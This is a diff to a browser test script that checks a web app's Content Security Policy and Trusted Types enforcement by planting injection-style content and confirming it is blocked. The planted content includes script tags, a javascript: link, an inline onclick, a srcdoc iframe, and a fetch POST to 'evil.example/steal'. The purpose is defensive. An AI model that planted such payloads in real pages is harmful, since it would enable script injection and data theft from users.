@@ -33,6 +33,9 @@ async def main():
     check('no script block carries attributes (a src= script would be outside the list)', not re.search(r'<script\s+[^>]', html))
     check("no 'unsafe-inline', 'unsafe-eval' or wildcard for script blocks", not any(x in ' '.join(d.get('script-src-elem', [])) for x in ["'unsafe-inline'", "'unsafe-eval'", '*', 'http:', 'https:', 'data:']))
     check("nothing may run text as code ('unsafe-eval' nowhere)", "'unsafe-eval'" not in csp and "'wasm-unsafe-eval'" not in csp)
+    check('script-src is the same list of hashes as script-src-elem (no self, no unsafe-inline)', sorted(d.get('script-src', [])) == want, [d.get('script-src'), want])
+    check("no inline handler is allowed: script-src-attr 'none'", d.get('script-src-attr') == ["'none'"], d.get('script-src-attr'))
+    check("Trusted Types are required for scripts and only the vcr2 policy may exist", d.get('require-trusted-types-for') == ["'script'"] and d.get('trusted-types') == ['vcr2'], [d.get('require-trusted-types-for'), d.get('trusted-types')])
     check('default-src none, frames none, objects none, base none, forms none', d.get('default-src') == ["'none'"] and d.get('frame-src') == ["'none'"] and d.get('object-src') == ["'none'"] and d.get('base-uri') == ["'none'"] and d.get('form-action') == ["'none'"])
     check('connections: the site, GitHub (Studio) and the five AI providers, nothing else', d.get('connect-src') == ["'self'", 'https://api.github.com', 'https://api.anthropic.com', 'https://api.openai.com', 'https://generativelanguage.googleapis.com', 'https://api.groq.com', 'https://openrouter.ai'], d.get('connect-src'))
     check('video and captions: the site only', set(d.get('media-src', [])) == {"'self'", 'file:'}, d.get('media-src'))
@@ -69,14 +72,14 @@ async def main():
         # now plant what an injection would plant
         await pg.evaluate("""() => {
           const host = document.createElement('div'); host.id = 'planted'; document.body.appendChild(host);
-          host.appendChild(document.createRange().createContextualFragment("<script>__x('script-element')<\\/script>"));
-          const s = document.createElement('script'); s.textContent = "__x('script-created')"; host.appendChild(s);
-          const s2 = document.createElement('script'); s2.src = 'https://evil.example/x.js'; host.appendChild(s2);
+          try { host.appendChild(document.createRange().createContextualFragment("<script>__x('script-element')<\\/script>")); window.__ctxf = 'allowed'; } catch (e) { window.__ctxf = e.name; }
+          try { const s = document.createElement('script'); s.textContent = "__x('script-created')"; host.appendChild(s); } catch (e) { window.__tts = (window.__tts || []).concat(e.name); }
+          try { const s2 = document.createElement('script'); s2.src = 'https://evil.example/x.js'; host.appendChild(s2); } catch (e) { window.__tts = (window.__tts || []).concat(e.name); }
           const a = document.createElement('a'); a.href = "javascript:__x('js-link')"; a.id = 'planted-link'; a.textContent = 'x'; host.appendChild(a);
           const i = document.createElement('img'); i.src = 'https://evil.example/beacon.gif?d=1'; host.appendChild(i);
           const f = document.createElement('iframe'); f.src = 'https://evil.example/'; host.appendChild(f);
-          const f2 = document.createElement('iframe'); f2.srcdoc = "<script>parent.__x('srcdoc')<\\/script>"; host.appendChild(f2);
-          const o = document.createElement('object'); o.data = 'https://evil.example/x.swf'; host.appendChild(o);
+          try { const f2 = document.createElement('iframe'); f2.srcdoc = "<script>parent.__x('srcdoc')<\/script>"; host.appendChild(f2); } catch (e) { window.__tts = (window.__tts || []).concat(e.name); }
+          try { const o = document.createElement('object'); o.data = 'https://evil.example/x.swf'; host.appendChild(o); } catch (e) { window.__tts = (window.__tts || []).concat(e.name); }
           const vd = document.createElement('video'); vd.src = 'https://evil.example/x.mp4'; vd.preload = 'auto'; host.appendChild(vd);
           const au = document.createElement('audio'); au.src = 'https://evil.example/x.mp3'; au.preload = 'auto'; host.appendChild(au);
           window.__fetch = fetch('https://evil.example/steal', { method:'POST', body:'x' }).then(() => 'sent', e => 'blocked');
@@ -88,6 +91,20 @@ async def main():
         hits = await pg.evaluate("() => window.__hits.slice()")
         check('a planted <script> element does not run (parsed or created)', not any(h.startswith('script') for h in hits), hits)
         check('a planted javascript: link does not run', 'js-link' not in hits, hits)
+        # an inline handler and the HTML sinks, as an injection would use them
+        await pg.evaluate("""() => {
+          const r = {};
+          try { const b = document.createElement('button'); b.setAttribute('onclick', "__x('inline-handler')"); document.body.appendChild(b); b.click(); r.attr = 'allowed'; } catch (e) { r.attr = e.name; }
+          try { document.body.insertAdjacentHTML('beforeend', '<i></i>'); r.adjacent = 'allowed'; } catch (e) { r.adjacent = e.name; }
+          try { document.createElement('div').innerHTML = '<img src=x>'; r.inner = 'allowed'; } catch (e) { r.inner = e.name; }
+          try { new DOMParser().parseFromString('<a/>', 'application/xml'); r.parser = 'allowed'; } catch (e) { r.parser = e.name; }
+          try { new Worker(URL.createObjectURL(new Blob(['1']))); r.worker = 'allowed'; } catch (e) { r.worker = e.name; }
+          try { trustedTypes.createPolicy('evil', { createHTML: s => s }); r.policy = 'allowed'; } catch (e) { r.policy = e.name; }
+          window.__tt = r;
+        }""")
+        tt = await pg.evaluate("() => window.__tt")
+        check('a planted inline onclick does not run', 'inline-handler' not in await pg.evaluate("() => window.__hits.slice()"))
+        check('Trusted Types refuse a plain string at an on... attribute, innerHTML, insertAdjacentHTML, createContextualFragment, DOMParser and new Worker, and a second policy', await pg.evaluate("() => window.__ctxf") == 'TypeError' and tt == {'attr': 'TypeError', 'adjacent': 'TypeError', 'inner': 'TypeError', 'parser': 'TypeError', 'worker': 'TypeError', 'policy': 'TypeError'}, tt)
         check('a planted frame does not run or load', 'srcdoc' not in hits, hits)
         check('a request to an outside host is refused', await pg.evaluate("() => window.__fetch") == 'blocked')
         check('nothing reached an outside host (script, image beacon, frame, object, video, audio, socket, beacon)', not outside, outside)
